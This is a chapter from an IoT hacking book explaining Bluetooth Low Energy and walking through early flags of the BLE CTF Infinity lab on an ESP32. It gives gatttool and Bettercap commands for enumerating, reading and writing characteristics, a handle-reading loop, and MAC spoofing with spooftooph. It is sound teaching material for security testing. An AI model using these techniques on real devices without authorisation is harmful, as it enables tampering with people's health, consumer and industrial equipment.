<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="269" id="Page_269"/>11</span><br/>
<span class="ChapterTitle">Bluetooth Low Energy</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro"><em>Bluetooth Low Energy (BLE)</em> is a version of the Bluetooth wireless technology IoT devices often use because of its low-energy consumption and because the pairing process is simpler than in previous Bluetooth versions. But BLE can also maintain similar, and sometimes greater, communication ranges. You can find it in all sorts of devices, from common health gadgets like smart watches or smart water bottles to critical medical equipment like insulin pumps and pacemakers. In industrial environments, you’ll see it in sensors, nodes, and gateways of all types. It’s even used in the military, where weapon components such as rifle scopes operate remotely via Bluetooth. Of course, these have already been hacked. </p>
<p>These devices use Bluetooth to take advantage of the simplicity and robustness of this radio communication protocol, but doing so increases a device’s attack surface. In this chapter, you’ll learn how BLE communications work, explore common hardware and software that communicates <span epub:type="pagebreak" title="270" id="Page_270"/>with BLE devices, and master techniques to effectively identify and exploit security vulnerabilities. You’ll set up a lab using the ESP32 development board and then walk through levels of an advanced Capture the Flag (CTF) exercise designed specifically for BLE. After reading this chapter, you should be ready to tackle some of the remaining unsolved challenges from this CTF laboratory. </p>
<h2 id="h1-500907c11-0001">How BLE Works</h2>
<p class="BodyFirst">BLE consumes significantly less power than traditional Bluetooth, but it can transmit small amounts of data very efficiently. Available since the Bluetooth 4.0 specification, BLE uses only 40 channels, covering the range of 2400 to 2483.5 MHz. In contrast, traditional Bluetooth uses 79 channels in that same range. </p>
<p>Although every application uses this technology differently, the most common way BLE devices communicate is by sending advertising packets. Also known as <em>beacons</em>, these packets broadcast the BLE device’s existence to other nearby devices (<a id="figureanchor11-1" href="#figure11-1">Figure 11-1</a>). These beacons sometimes send data, too.</p>
<figure>
<img src="Images/f11001.png" alt="f11001" width="750" height="460"/>
<figcaption><p><a id="figure11-1">Figure 11-1:</a> BLE devices send advertising packets to elicit a SCAN request.</p></figcaption>
</figure>
<p>To reduce power consumption, BLE devices only send advertising packets when they need to connect and exchange data; they sleep the rest of the time. The listening device, also called a <em>central device</em>, can respond to an advertising packet with a <em>SCAN request</em> sent specifically to the advertising device. The response to that scan uses the same structure as the advertising packet. It contains additional information that couldn’t fit on the initial advertising request, such as the full device name or any additional information the vendor needs.</p>
<p><span epub:type="pagebreak" title="271" id="Page_271"/><a id="figureanchor11-2" href="#figure11-2">Figure 11-2</a> shows BLE’s packet structure.</p>
<figure>
<img src="Images/f11002.png" alt="f11002" width="750" height="188"/>
<figcaption><p><a id="figure11-2">Figure 11-2:</a> BLE’s packet structure</p></figcaption>
</figure>
<p>The preamble byte synchronizes the frequency, whereas the four-byte access address is a connection identifier, which is used in scenarios where multiple devices are trying to establish connections on the same channels. Next, the Protocol Data Unit (PDU) contains the advertising data. There are several types of PDU; the most commonly used are ADV_NONCONN_IND and ADV_IND. Devices use the ADV_NONCONN_IND PDU type if they don’t accept connections, transmitting data only in the advertising packet. Devices use ADV_IND if they allow connections and stop sending advertising packets once a connection has been established. <a id="figureanchor11-3" href="#figure11-3">Figure 11-3</a> shows an ADV_IND packet in a Wireshark capture.</p>
<figure>
<img src="Images/f11003.png" alt="f11003" width="750" height="336"/>
<figcaption><p><a id="figure11-3">Figure 11-3:</a> A Wireshark display tree showing a BLE advertising packet of type ADV_IND</p></figcaption>
</figure>
<p>The type of packet used depends on the BLE implementation and project requirements. For example, you’ll find ADV_IND packets in smart IoT devices, such as smart water bottles or watches, because these seek to connect to a central device before performing further operations. On the other hand, you might find ADV_NONCONN_IND packets in beacons to detect an object’s proximity to sensors placed in various devices. </p>
<h3 id="h2-500907c11-0001">Generic Access Profile and Generic Attribute Profile </h3>
<p class="BodyFirst">All BLE devices have a <em>Generic Access Profile (GAP)</em> that defines how they can connect to other devices, communicate with them, and make themselves available for discovery through broadcasting. A peripheral device can be <span epub:type="pagebreak" title="272" id="Page_272"/>connected to only one central device, whereas a central device can connect to as many peripherals as the central device can support. After establishing a connection, peripherals don’t accept any more connections. For each connection, the peripheral sends advertising probes at intervals, using three different frequencies, until the central device responds and the peripheral acknowledges the response indicating it’s ready to begin the connection.  </p>
<p>The <em>Generic Attribute Profile (GATT)</em> defines how the device should format and transfer data. When you’re analyzing a BLE device’s attack surface, you’ll often concentrate your attention on the GATT (or GATTs), because it’s how device functionality gets triggered and how data gets stored, grouped, and modified. The GATT lists a device’s characteristics, descriptors, and services in a table as either 16- or 32-bits values. A <em>characteristic</em> is a data value sent between the central device and peripheral. These characteristics can have <em>descriptors</em> that provide additional information about them. Characteristics are often grouped in services if they’re related to performing a particular action. <em>Services</em> can have several characteristics, as illustrated in <a id="figureanchor11-4" href="#figure11-4">Figure 11-4</a>. </p>
<figure>
<img src="Images/f11004.png" alt="f11004" width="500" height="763"/>
<figcaption><p><a id="figure11-4">Figure 11-4:</a> The GATT server structure is composed of services, characteristics, and descriptors.</p></figcaption>
</figure>
<h2 id="h1-500907c11-0002">Working with BLE</h2>
<p class="BodyFirst">In this section, we’ll walk through the hardware and software you’ll need to communicate with BLE devices. We’ll introduce you to hardware you can use to establish BLE connections, as well as software for interacting with other devices. </p>
<h3 id="h2-500907c11-0002"><span epub:type="pagebreak" title="273" id="Page_273"/>BLE Hardware</h3>
<p class="BodyFirst">You can choose from a variety of hardware to interact with BLE. For simply sending and receiving data, integrated interfaces or cheap BLE USB dongles might be enough. But for sniffing and performing low-level protocol hacking, you’ll need something more robust. Prices for these devices vary widely; you’ll find a list of hardware for interacting with BLE in “Tools for IoT Hacking.” </p>
<p>In this chapter, we’ll use the ESP32 WROOM development board from Espressif Systems (<a href="https://www.espressif.com/" class="LinkURL">https://www.espressif.com/</a>), which supports 2.4 GHz Wi-Fi and BLE (<a id="figureanchor11-5" href="#figure11-5">Figure 11-5</a>). </p>
<figure>
<img src="Images/f11005.png" alt="f11005" width="434" height="750"/>
<figcaption><p><a id="figure11-5">Figure 11-5:</a>  ESP32 WROOM development board</p></figcaption>
</figure>
<p>It has an embedded flash memory, and conveniently, you can program and power it with a micro-USB cable. It’s very compact and affordable, and the antenna range is quite good for its size. You can program it for other attacks, too—for instance, attacks against Wi-Fi.</p>
<h3 id="h2-500907c11-0003">BlueZ</h3>
<p class="BodyFirst">Depending on the device you’re using, you might need to install the required firmware or drivers for your software to be recognized and work correctly. In Linux, you’ll most likely be using <em>BlueZ</em>, the official Bluetooth <span epub:type="pagebreak" title="274" id="Page_274"/>stack, although proprietary drivers exist for adapters from vendors such as Broadcom or Realtek. The tools we’ll cover in this section all work out of the box with BlueZ. </p>
<p>If you’re having a problem with BlueZ, be sure to install the latest version available at <a href="http://www.bluez.org/download/" class="LinkURL">http://www.bluez.org/download/</a> because you could be using an earlier version pre-included in your Linux distribution’s package manager.</p>
<h3 id="h2-500907c11-0004">Configuring BLE Interfaces </h3>
<p class="BodyFirst"><em>Hciconfig</em> is a Linux tool that you can use to configure and test your BLE connections. If you run Hciconfig with no arguments, you should see your Bluetooth interface. You should also see the state <code>UP</code> or <code>DOWN</code>, which indicates whether or not the Bluetooth adapter interface is enabled:</p>
<pre><code># <b>hciconfig</b>
hci0:    Type: Primary  Bus: USB
         BD Address: 00:1A:7D:DA:71:13  ACL MTU: 310:10  SCO MTU: 64:8
         UP RUNNING 
         RX bytes:1280 acl:0 sco:0 events:66 errors:0
         TX bytes:3656 acl:0 sco:0 commands:50 errors:0</code></pre>
<p>If you don’t see your interface, make sure the drivers are loaded. The kernel module name in Linux systems should be <code>bluetooth</code>. Use <code>modprobe</code> to show the module configuration with the <code>-c </code>option:</p>
<pre><code># <b>modprobe -c bluetooth</b></code></pre>
<p>You can also try bringing down the interface and then bringing it back up again with the following command:</p>
<pre><code># <b>hciconfig hci0 down &amp;&amp; hciconfig hci0 up</b></code></pre>
<p>If that doesn’t work, try resetting it:</p>
<pre><code># <b>hciconfig hci0 reset</b></code></pre>
<p>You can also list additional information with the <code>-a </code>option: </p>
<pre><code># <b>hciconfig hci0 -a</b>
hci0:    Type: Primary  Bus: USB
         BD Address: 00:1A:7D:DA:71:13  ACL MTU: 310:10  SCO MTU: 64:8
         UP RUNNING 
         RX bytes:17725 acl:0 sco:0 events:593 errors:0
         TX bytes:805 acl:0 sco:0 commands:72 errors:0
         Features: 0xff 0xff 0x8f 0xfe 0xdb 0xff 0x5b 0x87
         Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3 
         Link policy: RSWITCH HOLD SNIFF PARK 
         Link mode: SLAVE ACCEPT 
         Name: 'CSR8510 A10'
         Class: 0x000000
         Service Classes: Unspecified
         Device Class: Miscellaneous, 
<span epub:type="pagebreak" title="275" id="Page_275"/>         HCI Version: 4.0 (0x6)  Revision: 0x22bb
         LMP Version: 4.0 (0x6)  Subversion: 0x22bb
         Manufacturer: Cambridge Silicon Radio (10)</code></pre>
<h2 id="h1-500907c11-0003">Discovering Devices and Listing Characteristics</h2>
<p class="BodyFirst">If a BLE-enabled IoT device isn’t protected properly, you can intercept, analyze, modify, and retransmit its communications to manipulate the device’s operations. Overall, when assessing the security of an IoT device with BLE, you should follow this process: </p>
<ol class="decimal">
<li value="1">Discover the BLE device address</li>
<li value="2">Enumerate the GATT servers</li>
<li value="3">Identify their functionality through the listed characteristics, services, and attributes</li>
<li value="4">Manipulate the device functionality through read and write operations</li>
</ol>
<p>Let’s walk through these steps now using two tools: GATTTool and Bettercap. </p>
<h3 id="h2-500907c11-0005">GATTTool</h3>
<p class="BodyFirst"><em>GATTTool</em> is part of BlueZ. You’ll mainly use it for operations like establishing a connection with another device, listing that device’s characteristics, and reading and writing its attributes. Run GATTTool with no arguments to see the list of supported actions.</p>
<p>GATTTool can launch an interactive shell with the <code>-I</code> option. The following command sets the BLE adapter interface so you can connect to a device and list its characteristics:</p>
<pre><code># <b>gatttool -i hci0 -I</b></code></pre>
<p>Inside the interactive shell, issue the <code>connect </code><var>&lt;mac address&gt;</var> command to establish a connection; then list the characteristics with the<code> characteristics</code> subcommand:</p>
<pre><code>[                 ][LE]&gt; <b>connect 24:62:AB:B1:A8:3E</b> 
Attempting to connect to A4:CF:12:6C:B3:76
Connection successful
[A4:CF:12:6C:B3:76][LE]&gt; <b>characteristics</b>
handle: 0x0002, char properties: 0x20, char value handle: 0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb
handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb
…
handle: 0x0055, char properties: 0x02, char value handle: 0x0056, uuid: 0000ff17-0000-1000-8000-00805f9b34fb
[A4:CF:12:6C:B3:76][LE]&gt; exit</code></pre>
<p><span epub:type="pagebreak" title="276" id="Page_276"/>Now, we have the handles, values, and services that describe the data and operations the BLE device supports.</p>
<p>Let’s analyze this information with Bettercap, a more powerful tool that will help us see the information in a human-readable format.</p>
<h3 id="h2-500907c11-0006">Bettercap</h3>
<p class="BodyFirst"><em>Bettercap</em> (<a href="https://www.bettercap.org/" class="LinkURL">https://www.bettercap.org/</a>) is a tool for scanning and attacking devices that operate on the 2.4 GHz frequency. It provides a friendly interface (even a GUI) and extensible modules to perform the most common tasks for BLE scanning and attacking, such as listening to advertising packets and performing read/write operations. Additionally, you can use it to attack Wi-Fi, HID, and other technologies with man-in-the-middle attacks or other tactics. </p>
<p>Bettercap is installed on Kali by default, and it’s available in most Linux package managers. You can install and run it from Docker using the following commands:</p>
<pre><code># <b>docker pull bettercap/bettercap</b>
# <b>docker run -it --privileged --net=host bettercap/bettercap -h</b></code></pre>
<p>To discover BLE-enabled devices, enable the BLE module and start capturing beacons with the <code>ble.recon</code> option. Invoking it with the <code>--eval</code> option when loading Bettercap takes Bettercap commands and executes them automatically when Bettercap runs: </p>
<pre><code># <b>bettercap --eval “ble.recon on”</b>
Bettercap v2.24.1 (built for linux amd64 with go1.11.6) [type ‘help’ for a list of commands]
192.168.1.6/24 &gt; 192.168.1.159 &gt;&gt; [16:25:39] [ble.device.new] new BLE device BLECTF detected as A4:CF:12:6C:B3:76  -46 dBm
192.168.1.6/24 &gt; 192.168.1.159 &gt;&gt; [16:25:39] [ble.device.new] new BLE device BLE_CTF_SCORE detected as 24:62:AB:B1:AB:3E  -33 dBm
192.168.1.6/24 &gt; 192.168.1.159 &gt;&gt; [16:25:39] [ble.device.new] new BLE device detected as 48:1A:76:61:57:BA (Apple, Inc.)  -69 dBm</code></pre>
<p>You should see a line for each BLE advertising packet received. This information should include the device name and MAC address, which you’ll need to establish communication with the devices.</p>
<p>If you launched Bettercap with the <code>eval</code> option, you can record all discovered devices automatically. Then you can conveniently issue the <code>ble.show</code> command to list the discovered devices and related information, such as their MAC addresses, vendors, and flags (<a id="figureanchor11-6" href="#figure11-6">Figure 11-6</a>).</p>
<pre><code>&gt;&gt; <b>ble.show</b></code></pre>
<p>Notice that <code>ble.show</code> command output contains the signal strength (RSSI), the advertising MAC address we’ll use to connect to the device, and the vendor, which can give us a hint about the type of device we’re looking at. It also displays the combination of supported protocols, the connection status, and the last received beacon’s timestamp.</p>
<span epub:type="pagebreak" title="277" id="Page_277"/><figure>
<img src="Images/f11006.png" alt="f11006" width="750" height="133"/>
<figcaption><p><a id="figure11-6">Figure 11-6:</a> Bettercap shows discovered devices</p></figcaption>
</figure>
<h3 id="h2-500907c11-0007">Enumerating Characteristics, Services, and Descriptors </h3>
<p class="BodyFirst">Once we’ve identified our target device’s MAC address, we can run the following Bettercap command. This command obtains a nice, formatted table with the characteristics grouped by services, their properties, and the data available through the GATT: </p>
<pre><code>&gt;&gt; <b>ble.enum </b><var class="bold">&lt;mac addr&gt;</var></code></pre>
<p><a id="figureanchor11-7" href="#figure11-7">Figure 11-7</a> shows the resulting table. </p>
<figure>
<img src="Images/f11007.png" alt="f11007" width="750" height="463"/>
<figcaption><p><a id="figure11-7">Figure 11-7:</a> Enumerating GATT servers with Bettercap</p></figcaption>
</figure>
<p>In the data column, we can see that this GATT server is the dashboard of a CTF describing the different challenges, as well as instructions for submitting your answers and checking your score. </p>
<p>This is a fun way to learn about practical attacks. But before we jump into solving one, let’s make sure you know how to perform classic read and write operations. You’ll use these for reconnaissance and to write data that alters a device’s state. The WRITE property is highlighted when handles allow the operations; pay close attention to the handles that support this, because they’re often misconfigured.</p>
<h3 id="h2-500907c11-0008"><span epub:type="pagebreak" title="278" id="Page_278"/>Reading and Writing Characteristics</h3>
<p class="BodyFirst">In BLE, UUIDs uniquely identify characteristics, services, and attributes. Once you know a characteristic’s UUID, you can write data to it with the <code>ble.write</code> Bettercap command:</p>
<pre><code>&gt;&gt; <b>ble.write </b><var class="bold">&lt;MAC ADDR&gt; &lt;UUID&gt; &lt;HEX DATA&gt;</var><b/></code></pre>
<p>You must format all the data you send in hexadecimal format. For example, to write the word “hello” to characteristic UUID ff06, you would send this command inside Bettercap’s interactive shell:</p>
<pre><code>&gt;&gt; <b>ble.write </b><var class="bold">&lt;mac address of device&gt;</var><b> ff06 68656c6c6f</b></code></pre>
<p>You can also use GATTTool to read and write data. GATTTool supports additional input formats for specifying handlers or UUIDs. For example, to issue a <code>write</code> command with GATTTool instead of Bettercap, use the following command:</p>
<pre><code># <b>gatttool -i </b><var class="bold">&lt;Bluetooth adapter interface&gt;</var><b> -b </b><var class="bold">&lt;MAC address of device&gt;</var><b> --char-write-req </b><var class="bold">&lt;characteristic handle&gt; &lt;value&gt;</var></code></pre>
<p>Now, let’s practice reading some data using GATTTool. Grab the device name from the handler 0x16. (This is reserved by the protocol to be the name of the device.)</p>
<pre><code># <b>gatttool -i &lt;</b><b><i>Bluetooth adapter interface</i></b><b>&gt; -b &lt;</b><b><i>MAC address of device</i></b><b>&gt; --char-read -a 0x16</b>
# <b>gatttool -b a4:cf:12:6c:b3:76 --char-read -a 0x16</b>
Characteristic value/descriptor: 32 62 30 30 30 34 32 66 37 34 38 31 63 37 62 30 35 36 63 34 62 34 31 30 64 32 38 66 33 33 63 66</code></pre>
<p>You can now discover devices, list characteristics, and read and write data to attempt to manipulate the device’s functionality. You’re ready to start doing some BLE hacking.</p>
<h2 id="h1-500907c11-0004">BLE Hacking</h2>
<p class="BodyFirst">In this section, we’ll walk through a CTF  designed to help you practice hacking BLE: the BLE CTF Infinity project (<a href="https://github.com/hackgnar/ble_ctf_infinity/" class="LinkURL">https://github.com/hackgnar/ble_ctf_infinity/</a>). Solving the CTF challenges requires using basic and advanced concepts. This CTF runs on the ESP32 WROOM board.</p>
<p>We’ll use Bettercap and GATTTool, because one often works better than the other for certain tasks. Solving these practical challenges from this CTF will teach you how to explore unknown devices to discover functionality and manipulate the states of these devices. Before moving on, make sure you set up your development environment and toolchain for ESP32, as described at <a href="https://docs.espressif.com/projects/esp-idf/en/latest/get-started/" class="LinkURL">https://docs.espressif.com/projects/esp-idf/en/latest/get-started/</a>. Most of the steps will work as documented with a few considerations that we’ll mention next.</p>
<h3 id="h2-500907c11-0009"><span epub:type="pagebreak" title="279" id="Page_279"/>Setting Up BLE CTF Infinity</h3>
<p class="BodyFirst">To build BLE CTF Infinity, we recommend using a Linux box, because the <em>make</em> file performs some additional copy operations on the source code (feel free to write a <em>CMakeLists.txt</em> file if you prefer building it on Windows). The file you need for this build is included with this book’s resources at <a href="https://nostarch.com/practical-iot-hacking/" class="LinkURL">https://nostarch.com/practical-iot-hacking/</a>. To build it successfully, you need to do the following:</p>
<ol class="decimal">
<li value="1">Create an empty folder named <em>main</em> in the project’s <em>root</em> folder.</li>
<li value="2">Execute <code>make menuconfig</code>. Make sure your serial device is configured and has Bluetooth enabled, and that compiler warnings are not treated as errors. Again, we include the <em>sdkconfig</em> file for this build with this book’s resources.</li>
<li value="3">Run <code>make codegen</code> to run the Python script that copies the source files into the <em>main</em> folder among other things.</li>
<li value="4">Edit the file <em>main/flag_scoreboard.c</em> and change the variable <code>string_total_flags[]</code> from <code>0</code> to <code>00</code>.</li>
<li value="5">Run <code>make</code> to build the CTF and <code>make flash</code> to flash the board. When the process is complete, the CTF program will automatically start.  </li>
</ol>
<p>Once you have CTF running, you should see the beacons when scanning. Another option is to communicate with the assigned serial port (default baud rate 115200) and check the debug output.</p>
<pre><code>…
I (1059) BLE_CTF: create attribute table successfully, the number handle = 31

I (1059) BLE_CTF: SERVICE_START_EVT, status 0, service_handle 40
I (1069) BLE_CTF: advertising start successfully</code></pre>
<h3 id="h2-500907c11-0010">Getting Started</h3>
<p class="BodyFirst">Locate the scoreboard, which shows the handle for submitting flags, the handle for navigating the challenges, and another handle to reset the CTF. Then enumerate the characteristics with your favorite tool (<a id="figureanchor11-8" href="#figure11-8">Figure 11-8</a>).</p>
<p>The 0030 handle lets you navigate through the challenges. Using Bettercap, write the value <code>0001</code> to that handle to go to flag #1:</p>
<pre><code>&gt;&gt; <b>ble.write a4:cf:12:6c:b3:76 ff02 0001</b></code></pre>
<p>To do the same with GATTTool, use the following command:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x0030 -n 0001</b></code></pre>
<span epub:type="pagebreak" title="280" id="Page_280"/><figure>
<img src="Images/f11008.png" alt="f11008" width="750" height="427"/>
<figcaption><p><a id="figure11-8">Figure 11-8:</a> Bettercap enumerating BLE CTF Infinity</p></figcaption>
</figure>
<p>Once you’ve written the characteristic, the beacon name will indicate that you’re looking at the GATT server for flag #1. For example, Bettercap will show something like the following output:</p>
<pre><code>[ble.device.new] new BLE device FLAG_01 detected as A4:CF:12:6C:B3:76 -42 dBm</code></pre>
<p>This displays a new GATT table, one for each challenge. Now that you’re familiar with the basic navigation, let’s go back to the scoreboard:</p>
<pre><code>[a4:cf:12:6c:b3:76][LE]&gt; <b>char-write-req 0x002e 0x1</b></code></pre>
<p>Let’s begin with flag #0. Navigate to it by writing the value <code>0000</code> to the 0x0030 handle:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x0030 -n 0000</b></code></pre>
<p>Interestingly, challenge 0 seems to be nothing more than the initial GATT server displaying the scoreboard (<a id="figureanchor11-9" href="#figure11-9">Figure 11-9</a>). Did we miss anything? </p>
<p>After taking a closer look, the device name 04dc54d9053b4307680a looks a lot like a flag, right? Let’s test it by submitting the device name as an answer to the handle 002e. Note that if you use GATTTool, you need to format it in hex:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "04dc54d9053b4307680a"|xxd -ps)</b>
Characteristic value was written successfully</code></pre>
<p>When we examine the scoreboard, we see that it worked as flag 0 is shown as complete. We’ve solved the first challenge. Congratulations! </p>
<span epub:type="pagebreak" title="281" id="Page_281"/><figure>
<img src="Images/f11009.png" alt="f11009" width="750" height="427"/>
<figcaption><p><a id="figure11-9">Figure 11-9:</a> Characteristics of the BLE CTF INFINITY scoreboard</p></figcaption>
</figure>
<h3 id="h2-500907c11-0011">Flag 1: Examining Characteristics and Descriptors</h3>
<p class="BodyFirst">Now navigate to FLAG_01 using this command:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x0030 -n 0000</b></code></pre>
<p>For this flag, we once again begin by examining the GATT table. Let’s try using GATTTool to list the characteristics and descriptors:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 -I</b>
 [a4:cf:12:6c:b3:76][LE]&gt; connect
Attempting to connect to a4:cf:12:6c:b3:76
Connection successful
[a4:cf:12:6c:b3:76][LE]&gt; primary
attr handle: 0x0001, end grp handle: 0x0005 uuid: 00001801-0000-1000-8000-00805f9b34fb
attr handle: 0x0014, end grp handle: 0x001c uuid: 00001800-0000-1000-8000-00805f9b34fb
attr handle: 0x0028, end grp handle: 0xffff uuid: 000000ff-0000-1000-8000-00805f9b34fb
write-req   characteristics  
[a4:cf:12:6c:b3:76][LE]&gt; char-read-hnd 0x0001
Characteristic value/descriptor: 01 18 
[a4:cf:12:6c:b3:76][LE]&gt; char-read-hnd 0x0014
Characteristic value/descriptor: 00 18 
[a4:cf:12:6c:b3:76][LE]&gt; char-read-hnd 0x0028
Characteristic value/descriptor: ff 00 
 [a4:cf:12:6c:b3:76][LE]&gt; char-desc 
handle: 0x0001, uuid: 00002800-0000-1000-8000-00805f9b34fb
…
handle: 0x002e, uuid: 0000ff03-0000-1000-8000-00805f9b34fb</code></pre>
<p><span epub:type="pagebreak" title="282" id="Page_282"/>After examining each of the descriptors, we find a value in handle 0x002c that looks like a flag. To read a handle’s descriptor value, we can use the <code>char-read-hnd </code><var>&lt;handle&gt; </var>command, like this:</p>
<pre><code><b>[a4:cf:12:6c:b3:76][LE]&gt; char-read-hnd 0x002c</b>
Characteristic value/descriptor: 38 37 33 63 36 34 39 35 65 34 65 37 33 38 63 39 34 65 31 63</code></pre>
<p>Remember that the output is hex formatted, so this corresponds to the ASCII text 873c6495e4e738c94e1c.</p>
<p>We’ve found the flag! Navigate back to the scoreboard and submit the new flag, as we did previously with flag 0:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "873c6495e4e738c94e1c"|xxd -ps)</b>
Characteristic value was written successfully</code></pre>
<p>We could have also used bash to automate the discovery of this flag. In that case, we’d iterate through the handlers to read the value of each handler. We could easily rewrite the following script into a simple fuzzer that writes values instead of performing the <code>--char-read</code> operation:</p>
<pre><code>#!/bin/bash
for i in {1..46}
do
  VARX=`printf '%04x\n' $i`
  echo "Reading handle: $VARX"
  gatttool -b a4:cf:12:6c:b3:76 --char-read -a 0x$VARX
  sleep 5
done</code></pre>
<p>When we run the script, we should obtain the information from the handles:</p>
<pre><code>Reading handle: 0001
Characteristic value/descriptor: 01 18 
Reading handle: 0002
Characteristic value/descriptor: 20 03 00 05 2a 
…
Reading handle: 002e
Characteristic value/descriptor: 77 72 69 74 65 20 68 65 72 65 20 74 6f 20 67 6f 74 6f 20 74 6f 20 73 63 6f 72 65 62 6f 61 72 64</code></pre>
<h3 id="h2-500907c11-0012">Flag 2: Authentication</h3>
<p class="BodyFirst">When you view the FLAG_02 GATT table, you should see the message “Insufficient authentication” on handle 0x002c. You should also see the message “Connect with pin 0000” on handle 0x002a (<a id="figureanchor11-10" href="#figure11-10">Figure 11-10</a>). This challenge emulates a device with a weak pin code used for authentication. </p>
<span epub:type="pagebreak" title="283" id="Page_283"/><figure>
<img src="Images/f11010.png" alt="f11010" width="750" height="279"/>
<figcaption><p><a id="figure11-10">Figure 11-10:</a> We need to authenticate before reading the 002c handle.</p></figcaption>
</figure>
<p>The hint implies we need to establish a secure connection to read the protected 0x002c handle. To do this, we use GATTTool with the <code>--sec-level=high</code> option, which sets the security level of the connection to high and makes an authenticated, encrypted connection (<span class="ColorText" style="color:#000000">AES-CMAC or ECDHE</span>) before reading the value:</p>
<pre><code># <b>gatttool --sec-level=high -b a4:cf:12:6c:b3:76 --char-read -a 0x002c</b>
Characteristic value/descriptor: 35 64 36 39 36 63 64 66 35 33 61 39 31 36 63 30 61 39 38 64 </code></pre>
<p>Nice! This time, after converting from hex to ASCII, we get the flag 5d696cdf53a916c0a98d instead of the “Insufficient authentication” message. Go back to the scoreboard and submit it, as shown previously:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "5d696cdf53a916c0a98d"|xxd -ps)</b>
Characteristic value was written successfully</code></pre>
<p>The flag is correct, as shown on the scoreboard! We’ve solved challenge #2.</p>
<h3 id="h2-500907c11-0013">Flag 3: Spoofing Your MAC Address</h3>
<p class="BodyFirst">Navigate to FLAG_03 and enumerate the services and characteristics in its GATT server. On handle 0x002a is the message “Connect with mac 11:22:33:44:55:66” (<a id="figureanchor11-11" href="#figure11-11">Figure 11-11</a>). This challenge requires us to learn how to spoof the origin of the MAC address of a connection to read the handle.</p>
<figure>
<img src="Images/f11011.png" alt="f11011" width="750" height="260"/>
<figcaption><p><a id="figure11-11">Figure 11-11:</a> FLAG_3 characteristics using Bettercap</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="284" id="Page_284"/>This means we must spoof our real Bluetooth MAC address to get the flag. Although you can use Hciconfig to issue commands that will change your MAC, the <code>spooftooph</code><em> </em>Linux utility is a lot easier to use, because it doesn’t require you to send raw commands. Install it from your favorite package manager and run the following command to set your MAC to the address stated in the message:</p>
<pre><code># <b>spooftooph -i hci0 -a 11:22:33:44:55:66</b>
Manufacturer:   Cambridge Silicon Radio (10)
Device address: 00:1A:7D:DA:71:13
New BD address: 11:22:33:44:55:66

Address changed</code></pre>
<p>Verify your new spoofed MAC address using <code>hciconfig</code>:</p>
<pre><code># <b>hciconfig</b>
hci0:   Type: Primary  Bus: USB
        BD Address: 11:22:33:44:55:66  ACL MTU: 310:10  SCO MTU: 64:8
        UP RUNNING 
        RX bytes:682 acl:0 sco:0 events:48 errors:0
        TX bytes:3408 acl:0 sco:0 commands:48 errors:0</code></pre>
<p>Using Bettercap’s <code>ble.enum</code> command, take another look at the GATT server for this challenge. This time, you should see a new flag on the 0x002c handle (<a id="figureanchor11-12" href="#figure11-12">Figure 11-12</a>).</p>
<figure>
<img src="Images/f11012.png" alt="f11012" width="750" height="259"/>
<figcaption><p><a id="figure11-12">Figure 11-12:</a> FLAG_3 is shown after connecting with the desired MAC address.</p></figcaption>
</figure>
<p>Return to the scoreboard and submit your new flag:</p>
<pre><code># <b>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "0ad3f30c58e0a47b8afb"|xxd -ps)</b>
Characteristic value was written successfully</code></pre>
<p><span epub:type="pagebreak" title="285" id="Page_285"/>Then check the scoreboard to see your updated score (<a id="figureanchor11-13" href="#figure11-13">Figure 11-13</a>).</p>
<figure>
<img src="Images/f11013.png" alt="f11013" width="750" height="384"/>
<figcaption><p><a id="figure11-13">Figure 11-13:</a> The scoreboard after completing the first challenges</p></figcaption>
</figure>
<h2 id="h1-500907c11-0005">Conclusion</h2>
<p class="BodyFirst">After this brief introduction to BLE hacking, we hope we’ve inspired you to continue solving the CTF challenges. They’ll demonstrate real-life tasks that you’ll need daily when assessing BLE-enabled devices. We showed core concepts and some of the most popular attacks, but keep in mind that you can perform other attacks, too, such as man-in-the-middle attacks, if the device isn’t using a secure connection. </p>
<p>Many specific protocol implementation vulnerabilities currently exist. For every new application or protocol that uses BLE, there’s a chance the programmer made an error that introduced a security bug in their implementation. Although the new version of Bluetooth (5.0) is available now, the adoption phase is moving slowly, so you’ll see plenty of BLE devices in the years to come.</p>
</section>
</div></body></html>